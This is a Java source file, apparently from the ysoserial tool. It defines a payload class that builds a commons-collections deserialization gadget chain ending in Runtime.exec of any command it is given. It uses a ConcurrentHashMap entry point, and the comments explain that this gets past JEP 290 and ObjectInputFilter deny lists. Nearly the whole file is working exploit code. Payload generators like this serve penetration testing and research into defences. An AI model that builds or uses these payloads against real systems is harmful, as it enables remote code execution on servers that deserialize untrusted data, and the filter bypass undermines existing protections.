package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/*
	CC chain via ConcurrentHashMap entry point — bypasses HashMap/HashSet/Hashtable filters.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										InvokerTransformer.transform()
											Method.invoke()
												Runtime.exec()

	Why ConcurrentHashMap?
		- JEP 290 and custom ObjectInputFilters typically block:
		  HashMap, HashSet, Hashtable, PriorityQueue, TreeBag
		- ConcurrentHashMap is almost never blocked because:
		  1. It doesn't appear in any classic CC/CB/ROME chain
		  2. It's used extensively in JDK internals (blocking it breaks things)
		  3. Application code commonly serializes ConcurrentHashMap
		- Same TiedMapEntry → LazyMap → InvokerTransformer sink as CC6
		- ConcurrentHashMap.readObject() calls putVal() which calls key.hashCode()

	ConcurrentHashMap.readObject() internals (JDK 8+):
		1. Reads segments, loadFactor, concurrencyLevel
		2. Creates internal table
		3. Loop: reads key/value pairs, calls putVal(key, value, false)
		4. putVal() calls spread(key.hashCode()) → triggers our chain

	Construction technique:
		Same as CC6 but replace HashSet+HashMap backing with ConcurrentHashMap.
		We add a dummy entry first, then swap the key to TiedMapEntry via reflection.

	Ref: JDD (S&P 2024) — automatic entry point discovery
	     FLASH (S&P 2024) — filter-aware chain construction

	Requires:
		commons-collections 3.x (TiedMapEntry, LazyMap, InvokerTransformer)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.SU18 })
public class CommonsCollections10 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		final Transformer[] transformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		Transformer transformerChain = new ChainedTransformer(transformers);

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// Use ConcurrentHashMap instead of HashSet/HashMap
		ConcurrentHashMap<Object, Object> chm = new ConcurrentHashMap<Object, Object>(1);
		// Add a dummy entry — this calls entry.hashCode() but with the REAL key "foo"
		// We haven't armed the chain yet (LazyMap already has transformers, but the key
		// "foo" is not in innerMap, so LazyMap.get("foo") will fire transform).
		// To prevent premature execution, we add with a dummy key first.
		chm.put("dummy", "bar");

		// Now replace the key in ConcurrentHashMap's internal Node table
		// ConcurrentHashMap stores Node[] table where each Node has: hash, key, val, next
		Field tableField = ConcurrentHashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(chm);

		// Find the non-null node
		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				// ConcurrentHashMap$Node — set key to TiedMapEntry
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], entry);
				break;
			}
		}

		return chm;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections10.class, args);
	}
}
